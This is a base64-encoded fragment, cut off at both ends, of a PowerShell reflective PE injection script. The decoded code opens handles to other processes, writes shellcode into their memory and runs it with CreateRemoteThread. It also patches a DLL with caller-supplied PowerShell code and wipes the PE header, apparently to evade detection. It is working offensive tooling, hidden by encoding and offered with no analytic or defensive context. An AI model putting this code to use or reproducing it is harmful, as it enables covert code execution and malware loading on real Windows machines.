1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKICAgICAgICAgICAgICAgIGlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgICAgICAgICAgaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJFWEUiKQogICAgICAgIHsKICAgICAgICAgICAgI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZSBhbmQgRXhpdFByb2Nlc3Mgc28gd2UgY2FuIHByb3ZpZGUgb3VyIG93biBhcmd1bWVudHMgdG8gdGhlIEVYRSBhbmQgcHJldmVudCBpdCBmcm9tIGtpbGxpbmcgdGhlIFBTIHByb2Nlc3MKICAgICAgICAgICAgW0ludFB0cl0kRXhlRG9uZUJ5dGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoMSkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCwgMHgwMCkKICAgICAgICAgICAgJE92ZXJ3cml0dGVuTWVtSW5mbyA9IFVwZGF0ZS1FeGVGdW5jdGlvbnMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtRXhlQXJndW1lbnRzICRFeGVBcmdzIC1FeGVEb25lQnl0ZVB0ciAkRXhlRG9uZUJ5dGVQdHIKCiAgICAgICAgICAgICNJZiB0aGlzIGlzIGFuIEVYRSwgY2FsbCB0aGUgZW50cnkgcG9pbnQgaW4gYSBuZXcgdGhyZWFkLiBXZSBoYXZlIG92ZXJ3cml0dGVuIHRoZSBFeGl0UHJvY2VzcyBmdW5jdGlvbiB0byBpbnN0ZWFkIEV4aXRUaHJlYWQKICAgICAgICAgICAgIyAgIFRoaXMgd2F5IHRoZSByZWZsZWN0aXZlbHkgbG9hZGVkIEVYRSB3b24ndCBraWxsIHRoZSBwb3dlcnNoZWxsIHByb2Nlc3Mgd2hlbiBpdCBleGl0cywgaXQgd2lsbCBqdXN0IGtpbGwgaXRzIG93biB0aHJlYWQuCiAgICAgICAgICAgIFtJbnRQdHJdJEV4ZU1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5BZGRyZXNzT2ZFbnRyeVBvaW50KQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsIEVYRSBNYWluIGZ1bmN0aW9uLiBBZGRyZXNzOiAkKEdldC1IZXggJEV4ZU1haW5QdHIpLiBDcmVhdGluZyB0aHJlYWQgZm9yIHRoZSBFWEUgdG8gcnVuIGluLiIKCiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5DcmVhdGVUaHJlYWQuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgJEV4ZU1haW5QdHIsIFtJbnRQdHJdOjpaZXJvLCAoW1VJbnQzMl0wKSwgW1JlZl0oW1VJbnQzMl0wKSkgfCBPdXQtTnVsbAoKICAgICAgICAgICAgd2hpbGUoJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtCeXRlXSRUaHJlYWREb25lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEJ5dGUoJEV4ZURvbmVCeXRlUHRyLCAwKQogICAgICAgICAgICAgICAgaWYgKCRUaHJlYWREb25lIC1lcSAxKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvcHktQXJyYXlPZk1lbUFkZHJlc3NlcyAtQ29weUluZm8gJE92ZXJ3cml0dGVuTWVtSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFWEUgdGhyZWFkIGhhcyBjb21wbGV0ZWQuIgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBAKCRQRUluZm8uUEVIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSkKICAgIH0KICAgIAogICAgCiAgICBGdW5jdGlvbiBJbnZva2UtTWVtb3J5RnJlZUxpYnJhcnkKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgI0dldCBXaW4zMiBjb25zdGFudHMgYW5kIGZ1bmN0aW9ucwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgICRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9ucwogICAgICAgICRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgIAogICAgICAgICNDYWxsIEZyZWVMaWJyYXJ5IGZvciBhbGwgdGhlIGltcG9ydHMgb2YgdGhlIERMTAogICAgICAgIGlmICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuU2l6ZSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlZpcnR1YWxBZGRyZXNzKQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSW1wb3J0RGVzY3JpcHRvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRJbXBvcnREZXNjcmlwdG9yUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0lmIHRoZSBzdHJ1Y3R1cmUgaXMgbnVsbCwgaXQgc2lnbmFscyB0aGF0IHRoaXMgaXMgdGhlIGVuZCBvZiB0aGUgYXJyYXkKICAgICAgICAgICAgICAgIGlmICgkSW1wb3J0RGVzY3JpcHRvci5DaGFyYWN0ZXJpc3RpY3MgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZpcnN0VGh1bmsgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZvcndhcmRlckNoYWluIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5OYW1lIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5UaW1lRGF0ZVN0YW1wIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkRvbmUgdW5sb2FkaW5nIHRoZSBsaWJyYXJpZXMgbmVlZGVkIGJ5IHRoZSBQRSIKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKChBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJEltcG9ydERlc2NyaXB0b3IuTmFtZSkpKQogICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRJbXBvcnREbGxQYXRoKQoKICAgICAgICAgICAgICAgIGlmICgkSW1wb3J0RGxsSGFuZGxlIC1lcSAkbnVsbCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBnZXR0aW5nIERMTCBoYW5kbGUgaW4gTWVtb3J5RnJlZUxpYnJhcnksIERMTE5hbWU6ICRJbXBvcnREbGxQYXRoLiBDb250aW51aW5nIGFueXdheXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLkZyZWVMaWJyYXJ5Lkludm9rZSgkSW1wb3J0RGxsSGFuZGxlKQogICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGZyZWUgbGlicmFyeTogJEltcG9ydERsbFBhdGguIENvbnRpbnVpbmcgYW55d2F5cy4iIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRJbXBvcnREZXNjcmlwdG9yUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjQ2FsbCBEbGxNYWluIHdpdGggcHJvY2VzcyBkZXRhY2gKICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsaW5nIGRsbG1haW4gc28gdGhlIERMTCBrbm93cyBpdCBpcyBiZWluZyB1bmxvYWRlZCIKICAgICAgICAkRGxsTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCiAgICAgICAgJERsbE1haW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgJERsbE1haW4uSW52b2tlKCRQRUluZm8uUEVIYW5kbGUsIDAsIFtJbnRQdHJdOjpaZXJvKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWUuSW52b2tlKCRQRUhhbmRsZSwgW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpCiAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJVbmFibGUgdG8gY2FsbCBWaXJ0dWFsRnJlZSBvbiB0aGUgUEUncyBtZW1vcnkuIENvbnRpbnVpbmcgYW55d2F5cy4iIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgfQogICAgfQoKCiAgICBGdW5jdGlvbiBNYWluCiAgICB7CiAgICAgICAgJFdpbjMyRnVuY3Rpb25zID0gR2V0LVdpbjMyRnVuY3Rpb25zCiAgICAgICAgJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9ICBHZXQtV2luMzJDb25zdGFudHMKICAgICAgICAKICAgICAgICAkUmVtb3RlUHJvY0hhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAKICAgICAgICAjSWYgYSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgaW4gdG8gaXMgc3BlY2lmaWVkLCBnZXQgYSBoYW5kbGUgdG8gaXQKICAgICAgICBpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSAtYW5kICgkUHJvY05hbWUgLW5lICRudWxsKSAtYW5kICgkUHJvY05hbWUgLW5lICIiKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYW4ndCBzdXBwbHkgYSBQcm9jSWQgYW5kIFByb2NOYW1lLCBjaG9vc2Ugb25lIG9yIHRoZSBvdGhlciIKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUHJvY05hbWUgLW5lICRudWxsIC1hbmQgJFByb2NOYW1lIC1uZSAiIikKICAgICAgICB7CiAgICAgICAgICAgICRQcm9jZXNzZXMgPSBAKEdldC1Qcm9jZXNzIC1OYW1lICRQcm9jTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkKICAgICAgICAgICAgaWYgKCRQcm9jZXNzZXMuQ291bnQgLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYW4ndCBmaW5kIHByb2Nlc3MgJFByb2NOYW1lIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJFByb2Nlc3Nlcy5Db3VudCAtZ3QgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2NJbmZvID0gR2V0LVByb2Nlc3MgfCB3aGVyZSB7ICRfLk5hbWUgLWVxICRQcm9jTmFtZSB9IHwgU2VsZWN0LU9iamVjdCBQcm9jZXNzTmFtZSwgSWQsIFNlc3Npb25JZAogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRQcm9jSW5mbwogICAgICAgICAgICAgICAgVGhyb3cgIk1vcmUgdGhhbiBvbmUgaW5zdGFuY2Ugb2YgJFByb2NOYW1lIGZvdW5kLCBwbGVhc2Ugc3BlY2lmeSB0aGUgcHJvY2VzcyBJRCB0byBpbmplY3QgaW4gdG8uIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2NJZCA9ICRQcm9jZXNzZXNbMF0uSUQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjSnVzdCByZWFsaXplZCB0aGF0IFBvd2VyU2hlbGwgbGF1bmNoZXMgd2l0aCBTZURlYnVnUHJpdmlsZWdlIGZvciBzb21lIHJlYXNvbi4uIFNvIHRoaXMgaXNuJ3QgbmVlZGVkLiBLZWVwaW5nIGl0IGFyb3VuZCBqdXN0IGluY2FzZSBpdCBpcyBuZWVkZWQgaW4gdGhlIGZ1dHVyZS4KICAgICAgICAjSWYgdGhlIHNjcmlwdCBpc24ndCBydW5uaW5nIGluIHRoZSBzYW1lIFdpbmRvd3MgbG9nb24gc2Vzc2lvbiBhcyB0aGUgdGFyZ2V0LCBnZXQgU2VEZWJ1Z1ByaXZpbGVnZQojICAgICAgIGlmICgoR2V0LVByb2Nlc3MgLUlkICRQSUQpLlNlc3Npb25JZCAtbmUgKEdldC1Qcm9jZXNzIC1JZCAkUHJvY0lkKS5TZXNzaW9uSWQpCiMgICAgICAgewojICAgICAgICAgICBXcml0ZS1WZXJib3NlICJHZXR0aW5nIFNlRGVidWdQcml2aWxlZ2UiCiMgICAgICAgICAgIEVuYWJsZS1TZURlYnVnUHJpdmlsZWdlIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwojICAgICAgIH0gICAKICAgICAgICAKICAgICAgICBpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSkKICAgICAgICB7CiAgICAgICAgICAgICRSZW1vdGVQcm9jSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jSWQpCiAgICAgICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDb3VsZG4ndCBvYnRhaW4gdGhlIGhhbmRsZSBmb3IgcHJvY2VzcyBJRDogJFByb2NJZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiR290IHRoZSBoYW5kbGUgZm9yIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgaW4gdG8iCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICAjTG9hZCB0aGUgUEUgcmVmbGVjdGl2ZWx5CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkiCiAgICAgICAgCiAgICAgICAgI0RldGVybWluZSB3aGV0aGVyIG9yIG5vdCB0byB1c2UgMzJiaXQgb3IgNjRiaXQgYnl0ZXMKICAgICAgICBpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dJFJhd0J5dGVzID0gW0J5dGVbXV1bQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJFBFQnl0ZXM2NCkKICAgICAgICAgICAgd3JpdGUtdmVyYm9zZSAiNjQgQml0IEluamVjdGlvbiIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0kUmF3Qnl0ZXMgPSBbQnl0ZVtdXVtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkUEVCeXRlczMyKQogICAgICAgICAgICB3cml0ZS12ZXJib3NlICIzMiBCaXQgSW5qZWN0aW9uIgogICAgICAgIH0KICAgICAgICAjUkVQTEFDSU5HIFRIRSBDQUxMQkFDSyBCWVRFUyBXSVRIIFlPVVIgT1dOCiAgICAgICAgIyMjIyMjIyMjIyMjIyMKICAgICAgICAKICAgICAgICAjIHBhdGNoIGluIHRoZSBjb2RlIGJ5dGVzCiAgICAgICAgJFJhd0J5dGVzID0gSW52b2tlLVBhdGNoRGxsIC1EbGxCeXRlcyAkUmF3Qnl0ZXMgLUZpbmRTdHJpbmcgIkludm9rZS1SZXBsYWNlIiAtUmVwbGFjZVN0cmluZyAkUG9zaENvZGUKICAgICAgICAkUEVCeXRlcyA9ICRSYXdCeXRlcwogICAgICAgIAogICAgICAgICNyZXBsYWNlIHRoZSBNWiBIZWFkZXIKICAgICAgICAkUEVCeXRlc1swXSA9IDAKICAgICAgICAkUEVCeXRlc1sxXSA9IDAKICAgICAgICAkUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBpZiAoJFBFTG9hZGVkSW5mbyAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxvYWQgUEUsIGhhbmRsZSByZXR1cm5lZCBpcyBOVUxMIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzBdCiAgICAgICAgJFJlbW90ZVBFSGFuZGxlID0gJFBFTG9hZGVkSW5mb1sxXSAjb25seSBtYXR0ZXJzIGlmIHlvdSBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2VzcwogICAgICAgIAogICAgICAgIAogICAgICAgICNDaGVjayBpZiBFWEUgb3IgRExMLiBJZiBFWEUsIHRoZSBlbnRyeSBwb2ludCB3YXMgYWxyZWFkeSBjYWxsZWQgYW5kIHdlIGNhbiBub3cgcmV0dXJuLiBJZiBETEwsIGNhbGwgdXNlciBmdW5jdGlvbi4KICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgIGlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgIyMjIFlPVVIgQ09ERSBHT0VTIEhFUkUKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgc3dpdGNoICgkRnVuY1JldHVyblR5cGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICdXU3RyaW5nJyB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFdTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kV1N0cmluZ0Z1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiV1N0cmluZ0Z1bmMiCiAgICAgICAgICAgICAgICAgICAgaWYgKCRXU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXU3RyaW5nRnVuY0FkZHIsICRXU3RyaW5nRnVuY0RlbGVnYXRlKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJE91dHB1dFB0ciA9ICRXU3RyaW5nRnVuYy5JbnZva2UoKQogICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ1VuaSgkT3V0cHV0UHRyKQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkT3V0cHV0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJ1N0cmluZycgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nRnVuY0FkZHIgPSBHZXQtTWVtb3J5UHJvY0FkZHJlc3MgLVBFSGFuZGxlICRQRUhhbmRsZSAtRnVuY3Rpb25OYW1lICJTdHJpbmdGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRTdHJpbmdGdW5jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCiAgICAgICAgICAgICAgICAgICAgJFN0cmluZ0Z1bmMgPSBbU3lzdGVtLlJ1bnRpbW